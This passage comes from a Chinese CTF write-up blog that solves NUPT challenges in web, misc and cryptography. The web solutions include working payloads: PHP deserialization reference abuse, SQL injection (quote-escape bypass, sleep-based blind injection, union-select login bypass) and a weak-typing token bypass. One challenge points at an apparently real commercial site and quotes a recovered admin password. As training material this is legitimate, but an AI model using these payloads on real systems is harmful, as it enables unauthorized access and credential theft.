class="line">&gt;     &#125;</div><div class="line">&gt;     $o = unserialize($pass);</div><div class="line">&gt;     <span class="keyword">if</span> ($o) &#123;</div><div class="line">&gt;         $o-&gt;secret = <span class="string">"*"</span>;</div><div class="line">&gt;         <span class="keyword">if</span> ($o-&gt;secret === $o-&gt;enter)</div><div class="line">&gt;             <span class="keyword">echo</span> <span class="string">"Congratulation! Here is my secret: "</span>.$o-&gt;secret;</div><div class="line">&gt;         <span class="keyword">else</span> </div><div class="line">&gt;             <span class="keyword">echo</span> <span class="string">"Oh no... You can't fool me"</span>;</div><div class="line">&gt;     &#125;</div><div class="line">&gt;     <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"are you trolling?"</span>;</div><div class="line">&gt; &#125;</div><div class="line">&gt;</div></pre></td></tr></table></figure></blockquote><p>链接失效，本地搭建环境实验。反序列化后的secret成员被赋予未知的值却要求另一成员enter其值与之相同，</p><p>从官方文档看到这么一句</p><p><code>Circular references inside the array/object you are serializing will also be stored</code>，</p><p>说明对象包含的引用在序列化时也会被存储，所以如果enter指向secret的引用，两个成员的值就可以同步变化了。</p><figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span></span>&#123;</div><div class="line">    <span class="keyword">var</span> $secret;</div><div class="line">    <span class="keyword">var</span> $enter ;</div><div class="line">&#125;</div><div class="line">$f=<span class="keyword">new</span> just4fun();</div><div class="line">$f-&gt;enter=&amp;$f-&gt;secret;</div><div class="line">$sf=serialize($f);</div><div class="line">print_r($sf);</div><div class="line"></div><div class="line">$usf=unserialize($sf);</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br/&gt;'</span>;</div><div class="line">print_r($usf);</div></pre></td></tr></table></figure><p>输出如下</p><blockquote><p>O:8:”just4fun”:2:{s:6:”secret”;N;s:5:”enter”;R:2;}<br>just4fun Object ( [secret] =&gt; [enter] =&gt; )</p></blockquote><p>访问</p><p><code>http://127.0.0.1/nanyou.php?pass=O:8:%22just4fun%22:2:{s:6:%22secret%22;N;s:5:%22enter%22;R:2;}</code></p><p>验证成功。</p><p>别处看到flag为<code>nctf{serialize_and_unserialize}</code></p><h4 id="sql-injection4"><a href="#sql-injection4" class="headerlink" title="sql injection4"></a>sql injection4</h4><blockquote><p>继续注入吧~<br><a href="http://chinalover.sinaapp.com/web15/index.php" target="_blank" rel="external">题目地址</a></p><p>TIP:反斜杠可以用来转义<br>仔细查看相关函数的用法</p></blockquote><p><em>nctf{sql_injection_is_interesting}</em></p><p>页面源代码注释中有SQL构造方式：</p><figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="comment">#GOAL: login as admin,then get the flag;</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"><span class="keyword">require</span> <span class="string">'db.inc.php'</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span><span class="params">($str)</span></span>&#123;</div><div class="line"><span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</div><div class="line">$str=stripslashes($str);</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> htmlentities($str, ENT_QUOTES);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$username = @clean((string)$_GET[<span class="string">'username'</span>]);</div><div class="line">$password = @clean((string)$_GET[<span class="string">'password'</span>]);</div><div class="line"></div><div class="line">$query=<span class="string">'SELECT * FROM users WHERE name=\''</span>.$username.<span class="string">'\' AND pass=\''</span>.$password.<span class="string">'\';'</span>;</div><div class="line">$result=mysql_query($query);</div><div class="line"><span class="keyword">if</span>(!$result || mysql_num_rows($result) &lt; <span class="number">1</span>)&#123;</div><div class="line"><span class="keyword">die</span>(<span class="string">'Invalid password!'</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">echo</span> $flag;</div></pre></td></tr></table></figure><p>核心函数是<code>htmlentities($str, ENT_QUOTES)</code> ，函数原型是这样</p><figure class="highlight php"><table><tr><td class="code"><pre><div class="line">string htmlentities ( string $string [, int $flags = ENT_COMPAT | ENT_HTML401 [, string $encoding = ini_get(<span class="string">"default_charset"</span>) [, bool $double_encode = <span class="keyword">true</span> ]]] )</div></pre></td></tr></table></figure><p>参数flags缺省情况下与<code>$flags=ENT_QUOTES</code>情况下函数行为不同，</p><p>选值为<code>ENT_QUOTES</code>时<code>Will convert both double and single quotes</code>，</p><p>也就是说，前者不会将单引号编码而后者会。我们的最终目标是平衡引号，从而使查询语句语法正确，既然无法输入单引号，就消灭单引号。</p><p>访问<code>http://chinalover.sinaapp.com/web15/index.php?username=\&amp;password=%20or%201%23</code>，</p><p>也就是构造payload为<code>?username=\&amp;password=%20or%201%23</code> ，使得查询语句如下：</p><figure class="highlight sql"><table><tr><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">name</span>=<span class="string">'\' AND pass='</span>%<span class="number">20</span><span class="keyword">or</span>%<span class="number">201</span>%<span class="number">23</span><span class="string">'</span></div><div class="line"><span class="string">即</span></div><div class="line"><span class="string">SELECT * FROM users WHERE </span></div><div class="line"><span class="string">name='</span>\<span class="string">' AND pass='</span>  『 [<span class="keyword">name</span>]的值为 [<span class="string">' AND pass=]  ，显然逻辑值为false 』</span></div><div class="line"><span class="string">or 1                 『 但没关系，[false or 1] 的逻辑值为真』 </span></div><div class="line"><span class="string">#'</span>                   『 注释掉多余的单引号 』</div><div class="line">即</div><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="literal">false</span> <span class="keyword">or</span> <span class="number">1</span></div></pre></td></tr></table></figure><p>附：</p><p>​    具体编码方式可使用</p><p><code>print_r(get_html_translation_table($table =HTML_ENTITIES,$flags=ENT_QUOTES))</code>查看，</p><table><thead><tr><th style="text-align:center">`ENT_COMPAT</th><th style="text-align:center">ENT_HTML401`</th><th><code>ENT_QUOTES</code></th></tr></thead><tbody><tr><td style="text-align:center"><code>[&amp;] =&gt; &amp;amp;</code></td><td style="text-align:center"><code>[&amp;] =&gt; &amp;amp;</code></td></tr><tr><td style="text-align:center"><code>[&quot;] =&gt; &amp;quot;</code></td><td style="text-align:center"><code>[&quot;] =&gt; &amp;quot;</code></td></tr><tr><td style="text-align:center"><code>[&lt;] =&gt; &amp;lt;</code></td><td style="text-align:center"><code>[&#39;] =&gt; &amp;#039;</code></td></tr><tr><td style="text-align:center"><code>[&gt;] =&gt; &amp;gt;</code></td><td style="text-align:center"><code>[&lt;] =&gt; &amp;lt;</code></td></tr><tr><td style="text-align:center">…</td><td style="text-align:center"><code>[&gt;] =&gt; &amp;gt;</code></td></tr><tr><td style="text-align:center">共100个</td><td style="text-align:center">共101个</td></tr></tbody></table><h4 id="综合题"><a href="#综合题" class="headerlink" title="综合题"></a><a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php" target="_blank" rel="external">综合题</a></h4><p><em>nctf{bash_history_means_what}</em></p><p>1、访问链接得到一大段jsfuck代码，解码后得到<code>document.write(&quot;1bc29b36f623ba82aaf6724fd3b16718.php&quot;)</code> ;</p><p>2、访问 <em><a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php" target="_blank" rel="external">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php</a></em> 在HTTP响应头得到提示<code>tip:history of bash</code>;</p><p>3、访问 <em><a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history" target="_blank" rel="external">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history</a></em>  ，看到页面内容为<code>zip -r flagbak.zip ./*</code> ;</p><p>4、访问 <em><a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip" target="_blank" rel="external">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip</a></em>  得到flag。</p><h4 id="sql-注入2"><a href="#sql-注入2" class="headerlink" title="sql 注入2"></a>sql 注入2</h4><blockquote><p>注入第二题~~主要考察union查询<br>传送门:<a href="http://4.chinalover.sinaapp.com/web6/index.php" target="_blank" rel="external">点我带你飞</a></p></blockquote><p><em>ntcf{union_select_is_wtf}</em></p><p><code>index/phps</code>中有源码如下</p><figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</div><div class="line">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</div><div class="line">  mysql_select_db(SAE_MYSQL_DB);</div><div class="line">  $user = $_POST[user];</div><div class="line">  $pass = md5($_POST[pass]);</div><div class="line">  $query = @mysql_fetch_array(mysql_query(<span class="string">"select pw from ctf where user='$user'"</span>));</div><div class="line">  <span class="keyword">if</span> (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;</div><div class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;"</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;Log in failure!&lt;/p&gt;"</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>因为</p><figure class="highlight php"><table><tr><td class="code"><pre><div class="line">var_dump(!strcasecmp(<span class="keyword">array</span>(), $query[pw]));<span class="comment">//bool(true)</span></div><div class="line">var_dump(!strcasecmp(md5(<span class="keyword">array</span>()), $query[pw]));<span class="comment">//bool(false)</span></div></pre></td></tr></table></figure><p>所以没法用把pass作为数组传进去的伎俩。另外虽然第七行的<code>$user</code>处存在注入，但输出没有回显。想到基于时间延迟的盲注。主要用到三个函数，<a href="https://dev.mysql.com/doc/refman/5.5/en/string-functions.html#function_mid" target="_blank" rel="external">mid()</a>，<a href="https://dev.mysql.com/doc/refman/5.5/en/control-flow-functions.html#function_if" target="_blank" rel="external">if()</a>和<a href="https://dev.mysql.com/doc/refman/5.5/en/miscellaneous-functions.html#function_sleep" target="_blank" rel="external">sleep()</a>：</p><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">MID(str,pos,len)</div><div class="line">/*需注意pos从1而不是0开始，Return a substring starting from the specified position*/</div><div class="line">IF(expr1,expr2,expr3)</div><div class="line">/*If expr1 is TRUE (expr1 &lt;&gt; 0 and expr1 &lt;&gt; NULL), IF() returns expr2. Otherwise, it returns expr3.*/</div><div class="line">SLEEP(duration)</div><div class="line">/*Sleeps (pauses) for the number of seconds given by the duration argument, then returns 0.If SLEEP() is interrupted, it returns 1. The duration may have a fractional part.*/</div></pre></td></tr></table></figure><p>所以构造post数据</p><figure class="highlight php"><table><tr><td class="code"><pre><div class="line">user=admin<span class="string">' and if(mid(pw,1,1)&gt;'</span><span class="number">9</span><span class="string">',sleep(2),1)#&amp;pass=blabla</span></div></pre></td></tr></table></figure><p>如果<code>if()</code>函数的<code>expr1</code>正确，页面响应就会延时两秒，否则不会，以此为依据采用二分法调整。</p><p><code>pw</code>字段的取值范围为<code>/[\da-e]/</code>，</p><p>最后注处字段值为<code>21dd715a3605b2a4053e80387116c190</code>，即<code>md5(&#39;njupt&#39;)</code></p><p>然后post<code>user=admin&amp;pass=njupt</code>即可。 </p><blockquote><p> index.phps藏源码。</p> <figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&gt;  查到另一种简单的做法，即post如下数据</div><div class="line">&gt;  user=&apos; union select &apos;45cf93bd4f762c6597b68e615b153bd0&apos;#&amp;pass=findneo</div><div class="line">&gt;  其中&apos;45cf93bd4f762c6597b68e615b153bd0&apos;即md5(&apos;findneo&apos;)</div><div class="line">&gt;</div></pre></td></tr></table></figure></blockquote><p>&gt;</p><blockquote><p> 这才是出题者的本意。我觉得这个做法很妙，看似理所当然的代码逻辑实际上不堪一击。</p></blockquote><h4 id="综合题2"><a href="#综合题2" class="headerlink" title="综合题2"></a>综合题2</h4><blockquote><p>非xss题 但是欢迎留言~<br>地址：<a href="http://cms.nuptzj.cn/" target="_blank" rel="external">get the flag</a></p><p><code>flag:nctf{you_are_s0_g00d_hacker}</code></p></blockquote><p>详见<a href="https://findneo.github.io/2017/10/nupt-zonghe2/">南邮CTF平台综合题2writeup</a></p><h4 id="注入实战一"><a href="#注入实战一" class="headerlink" title="注入实战一"></a>注入实战一</h4><blockquote><p>请使用firefox浏览器，并安装hackbar插件（自行百度并熟悉）<br>目标网址：<a href="http://www.backstagecommerce.ca/services.php?id=4" target="_blank" rel="external">地址</a><br>flag为管理员密码的32位md5(小写)<br>并且加上nctf{}</p><p>手注教程群里面发过。<br>看不懂的话自行百度”mysql手动注入”查阅相关文章</p><p>PS:用sqlmap等工具做的就不要厚脸皮提交了</p></blockquote><p>题目貌似坏了，放个  <a href="http://blog.csdn.net/qq_31481187/article/details/52097287#t33" target="_blank" rel="external">4ct10n 的解答</a>吧。</p><blockquote><p>密码就在上图BSCmarketing24<br>然后再md5加密成 f3d6cc916d0739d853e50bc92911dddb<br>flag: nctf{f3d6cc916d0739d853e50bc92911dddb}</p></blockquote><h4 id="密码重置2"><a href="#密码重置2" class="headerlink" title="密码重置2"></a>密码重置2</h4><blockquote><p>题题被秒，当时我就不乐意了！<br>本题来源于CUMT<br><a href="http://nctf.nuptzj.cn/web14/index.php" target="_blank" rel="external">题目链接</a></p><p>TIPS:<br>1.管理员邮箱观察一下就可以找到<br>2.linux下一般使用vi编辑器，并且异常退出会留下备份文件<br>3.弱类型bypass</p></blockquote><p><em>nctf{thanks_to_cumt_bxs}</em></p><p>1、按照提示，源码中看到管理员邮箱为<code>admin@nuptzj.cn</code> ；</p><p>2、<code>wget http://nctf.nuptzj.cn/web14/.submit.php.swp</code> ；</p><p>3、</p><figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($token)&amp;&amp;!<span class="keyword">empty</span>($emailAddress))&#123;</div><div class="line"><span class="keyword">if</span>(strlen($token)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</div><div class="line"><span class="keyword">if</span>($token!=<span class="string">'0'</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</div><div class="line">$sql = <span class="string">"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'"</span>;</div><div class="line">$r = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'db error'</span>);</div><div class="line">$r = mysql_fetch_assoc($r);</div><div class="line">$r = $r[<span class="string">'num'</span>];</div><div class="line"><span class="keyword">if</span>($r&gt;<span class="number">0</span>)&#123;</div><div class="line"><span class="keyword">echo</span> $flag;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"失败了呀"</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>要求token长度为10且<code>token!=&#39;0&#39;</code>为假，可利用弱类型（含有数字内容的字符串也会被转换类型，所以<code>&#39;0e123&#39;==&#39;0&#39;</code>值为真）绕过，访问 <em><a href="http://nctf.nuptzj.cn/web14/submit.php?emailAddress=admin%40nuptzj.cn&amp;token=0e12345678" target="_blank" rel="external">http://nctf.nuptzj.cn/web14/submit.php?emailAddress=admin%40nuptzj.cn&amp;token=0e12345678</a></em>  即可。 </p><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="图种"><a href="#图种" class="headerlink" title="图种"></a>图种</h4><blockquote><p>flag是动态图最后一句话的拼音首字母<br>加上nctf{}</p></blockquote><p><em>nctf{dssdcmlw}</em></p><p><code>binwalk -e 555.gif</code>分离出一张233333.gif，动态图的最后一帧的最后一句话是 <em>都深深的出卖了我</em> </p><h4 id="丘比龙De女神"><a href="#丘比龙De女神" class="headerlink" title="丘比龙De女神"></a>丘比龙De女神</h4><blockquote><p>丘比龙是丘比特的弟弟，由于吃了太多的甜甜圈导致他飞不动了！</p><p>没错 里面隐藏了一张女神的照片<br>flag是照片文件的md5值(小写)<br>记住加上flag{}</p></blockquote><p>文件尾有nvshen.jpg字样，故搜索字符串nvshen，共出现两次，猜测从第一次出现位置上方的love起到文件末尾为一个密码为love的压缩包，复制出来后修改<code>6C6F7665</code> 为<code>504b0304</code> ,解压得到女神的照片。</p><p>flag{a6caad3aaafa11b6d5ed583bef4d8a54} </p><h3 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h3><h4 id="easy"><a href="#easy" class="headerlink" title="easy!"></a>easy!</h4><blockquote><p>密文：bmN0Znt0aGlzX2lzX2Jhc2U2NF9lbmNvZGV9<br>这题做不出来就剁手吧！</p></blockquote><p><em>nctf{this_is_base64_encode}</em></p><p>在Linux命令行输入<code>echo bmN0Znt0aGlzX2lzX2Jhc2U2NF9lbmNvZGV9 | base64 -d</code>即可</p><h4 id="keyboard"><a href="#keyboard" class="headerlink" title="keyboard"></a>keyboard</h4><blockquote><p>看键盘看键盘看键盘！<br>答案非标准格式，提交前加上nctf{}<br>ytfvbhn tgbgy hjuygbn yhnmki tgvhn uygbnjm uygbn yhnijm</p></blockquote><p>观察题干字符串在键盘上的位置构成的轨迹。</p><p> <em>nctf{areuhack}</em> </p><h4 id="base64全家桶"><a href="#base64全家桶" class="headerlink" title="base64全家桶"></a>base64全家桶</h4><blockquote><p>全家桶全家桶全家桶！<br>我怎么饿了。。。。。。<br>密文(解密前删除回车)：</p><p>R1pDVE1NWlhHUTNETU4yQ0dZWkRNTUpYR00zREtNWldHTTJES<br>1JSV0dJM0RDTlpUR1kyVEdNWlRHSTJVTU5SUkdaQ1RNTkJWSVk<br>zREVOUlJHNFpUTU5KVEdFWlRNTjJF</p></blockquote><p>按base64、base32、base16的顺序解码一遍即可。</p><p><em>nctf{base64 _ base32_and_base16}</em></p><h4 id="n次base64"><a href="#n次base64" class="headerlink" title="n次base64"></a><a href="http://chinalover.sinaapp.com/decode1/base64.txt" target="_blank" rel="external">n次base64</a></h4><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> base64 <span class="keyword">as</span> b</div><div class="line">s=<span class="string">'**'</span></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">  s=b.b64decode(s)</div><div class="line">  <span class="keyword">print</span> s</div></pre></td></tr></table></figure><p><em>nctf{please_use_python_to_decode_base64}</em></p><h4 id="骚年来一发吗"><a href="#骚年来一发吗" class="headerlink" title="骚年来一发吗"></a>骚年来一发吗</h4><blockquote><p>密文：iEJqak3pjIaZ0NzLiITLwWTqzqGAtW2oyOTq1A3pzqas</p><figure class="highlight php"><table><tr><td class="code"><pre><div class="line">&gt; <span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($str)</span></span>&#123;</div><div class="line">&gt;   $_o=strrev($str);</div><div class="line">&gt;   <span class="keyword">for</span>($_0=<span class="number">0</span>;$_0&lt;strlrn($_o),$_0++)&#123;</div><div class="line">&gt;     $_c=substr($_o,$_0,<span class="number">1</span>);</div><div class="line">&gt;     $__=ord($_c)+<span class="number">1</span>;</div><div class="line">&gt;     $_c=chr($__);</div><div class="line">&gt;     $_=$_.$_c;</div><div class="line">&gt;   &#125;</div><div class="line">&gt;   <span class="keyword">return</span> str_rot13(strrev(base64_encode($_)));</div><div class="line">&gt; &#125;</div><div class="line">&gt;</div></pre></td></tr></table></figure></blockquote><p>encode函数先反转明文字符串，再逐字符加一，然后base64编码，再反转，再rot13，然后返回加密后的字符串。</p><figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$s=<span class="string">"iEJqak3pjIaZ0NzLiITLwWTqzqGAtW2oyOTq1A3pzqas"</span>;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span><span class="params">($str)</span></span>&#123;</div><div class="line">    $strtmp=base64_decode(strrev(str_rot13($str)));</div><div class="line">    $res=<span class="string">''</span>;</div><div class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($strtmp);$i++)&#123;</div><div class="line">        $res.=chr(ord(substr($strtmp, $i,<span class="number">1</span>))<span class="number">-1</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> strrev($res);</div><div class="line">&#125;</div><div class="line"><span class="keyword">echo</span> decode($s);</div></pre></td></tr></table></figure><p><em>nctf{rot13and_base64and_strrev}</em></p><h4 id="mixed-base64"><a href="#mixed-base64" class="headerlink" title="mixed base64"></a><a href="http://ctf.nuptsast.com/static/uploads/3e5c0c7045f2a81363a45d97d69911e3/code.txt" target="_blank" rel="external">mixed base64</a></h4><blockquote><p>多重base64加密，干(sang)得(xin)漂(bing)亮(kuang)!</p><figure class="highlight python"><table><tr><td class="code"><pre><div class="line">&gt; <span class="keyword">import</span> random</div><div class="line">&gt; <span class="keyword">from</span> base64 <span class="keyword">import</span> *</div><div class="line">&gt; result=&#123;</div><div class="line">&gt;   <span class="string">'16'</span>:<span class="keyword">lambda</span> x:b16encode(x),</div><div class="line">&gt;   <span class="string">'32'</span>:<span class="keyword">lambda</span> x:b32encode(x),</div><div class="line">&gt;   <span class="string">'64'</span>:<span class="keyword">lambda</span> x:b64encode(x)</div><div class="line">&gt; &#125;</div><div class="line">&gt; flag=<span class="string">b"&#123;nctf&#123;***&#125;"</span></div><div class="line">&gt; <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</div><div class="line">&gt;   a=random.choice([<span class="string">'16'</span>,<span class="string">'32'</span>,<span class="string">'64'</span>])</div><div class="line">&gt;   flag=result[a](flag)</div><div class="line">&gt; <span class="keyword">with</span> open(<span class="string">"code.txt"</span>,<span class="string">'wb'</span>)<span class="keyword">as</span> f:</div><div class="line">&gt;   f.write(flag)</div><div class="line">&gt;</div></pre></td></tr></table></figure></blockquote><p>解码代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b32decode, b16decode</div><div class="line"><span class="keyword">with</span> open(<span class="string">'code.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</div><div class="line">    c = f.read()</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">trys</span><span class="params">(s)</span>:</span></div><div class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> [b64decode, b32decode, b16decode]:</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            t = f(s)</div><div class="line">            <span class="keyword">if</span> t[:<span class="number">4</span>] == <span class="string">"nctf"</span>:</div><div class="line">                <span class="keyword">print</span> t</div><div class="line">                <span class="keyword">return</span> <span class="number">0</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                trys(t)</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            <span class="keyword">pass</span></div><div class="line">trys(c)</div></pre></td></tr></table></figure><p><em>nctf{random_mixed_base64_encode}</em></p><h4 id="异性相吸"><a href="#异性相吸" class="headerlink" title="异性相吸"></a><a href="http://ctf.nuptsast.com/static/uploads/7ecc0dbd59f262e698b2dd94b39825bc/biubiubiu.zip" target="_blank" rel="external">异性相吸</a></h4><blockquote><p>同性真爱，异性相吸都是假的！<br>（题目要求，我是直的）</p><p>解密压缩文件里的内容</p><p>TIPS:<br>1.xor<br>2.hex2binary<br>3.len(bin(miwen))==len(bin(mingwen))</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><div class="line">c=open(<span class="string">'密文.txt'</span>).read()</div><div class="line">p=open(<span class="string">'明文.txt'</span>).read()</div><div class="line">s=<span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(c)):</div><div class="line"> s+=chr(ord(c[i])^ord(p[i]))</div><div class="line"><span class="keyword">print</span> s</div></pre></td></tr></table></figure><p><em>nctf{xor_xor_xor_biubiubiu}</em></p><h4 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h4><blockquote><p>python大法好！<br>这里有一段丢失的md5密文<br>e9032???da???08????911513?0???a2<br>要求你还原出他并且加上nctf{}提交</p><p>已知线索 明文为： TASC?O3RJMV?WDJKX?ZM</p><p>题目来源：安恒杯</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> hashlib</div><div class="line">pool = <span class="string">'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></div><div class="line">s0 = <span class="string">'TASC?O3RJMV?WDJKX?ZM'</span></div><div class="line">ss = s0.split(<span class="string">'?'</span>)</div><div class="line">m = <span class="string">'e9032???da???08????911513?0???a2'</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pool:</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> pool:</div><div class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> pool:</div><div class="line">            s = ss[<span class="number">0</span>] + i + ss[<span class="number">1</span>] + j + ss[<span class="number">2</span>] + k + ss[<span class="number">3</span>]</div><div class="line">            <span class="keyword">if</span> hashlib.md5(s).hexdigest()[:<span class="number">5</span>] == m[:<span class="number">5</span>]:</div><div class="line">                <span class="keyword">print</span> s, hashlib.md5(s).hexdigest()</div><div class="line">                <span class="keyword">break</span></div></pre></td></tr></table></figure><p><em>nctf{e9032994dabac08080091151380478a2}</em></p><h4 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenere"></a>Vigenere</h4><blockquote><p>It is said that Vigenere cipher does not achieve the perfect secrecy actually :-)</p><p>Tips:<br>1.The encode pragram is given;<br>2.Do u no <a href="https://en.wikipedia.org/wiki/Index_of_coincidence" target="_blank" rel="external">index of coincidence </a>？<br>3.The key is last 6 words of the plain text(with “nctf{}” when submitted, also without any interpunction)</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><div class="line">http:<span class="comment">//ctf.nuptsast.com/static/uploads/13706e3281c1fb0c04417d3452cb745b/encode.cpp</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_LENGTH 2 <span class="comment">// Can be anything from 1 to 13</span></span></div><div class="line"></div><div class="line">main()&#123;</div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> ch;</div><div class="line">  FILE *fpIn, *fpOut;</div><div class="line">  <span class="keyword">int</span> i;</div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> key[KEY_LENGTH] = &#123;<span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</div><div class="line">  <span class="comment">/* of course, I did not use the all-0s key to encrypt */</span></div><div class="line"></div><div class="line">  fpIn = fopen(<span class="string">"ptext.txt"</span>, <span class="string">"r"</span>);</div><div class="line">  fpOut = fopen(<span class="string">"ctext.txt"</span>, <span class="string">"w"</span>);</div><div class="line"></div><div class="line">  i=<span class="number">0</span>;</div><div class="line">  <span class="keyword">while</span> (<span class="built_in">fscanf</span>(fpIn, <span class="string">"%c"</span>, &amp;ch) != EOF) &#123;</div><div class="line">    <span class="comment">/* avoid encrypting newline characters */</span>  </div><div class="line">    <span class="comment">/* In a "real-world" implementation of the Vigenere cipher, </span></div><div class="line"><span class="comment">       every ASCII character in the plaintext would be encrypted.</span></div><div class="line"><span class="comment">       However, I want to avoid encrypting newlines here because </span></div><div class="line"><span class="comment">       it makes recovering the plaintext slightly more difficult... */</span></div><div class="line">    <span class="comment">/* ...and my goal is not to create "production-quality" code =) */</span></div><div class="line">    <span class="keyword">if</span> (ch!=<span class="string">'\n'</span>) &#123;</div><div class="line">      <span class="built_in">fprintf</span>(fpOut, <span class="string">"%02X"</span>, ch ^ key[i % KEY_LENGTH]); <span class="comment">// ^ is logical XOR    </span></div><div class="line">      i++;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line"> </div><div class="line">  fclose(fpIn);</div><div class="line">  fclose(fpOut);</div><div class="line">  <span class="keyword">return</span>;</div><div class="line">&#125; </div><div class="line">----------------------------------------------------------------------------------</div><div class="line">http:<span class="comment">//ctf.nuptsast.com/static/uploads/9a27a6c8b9fb7b8d2a07ad94924c02e5/code.txt</span></div><div class="line"></div><div 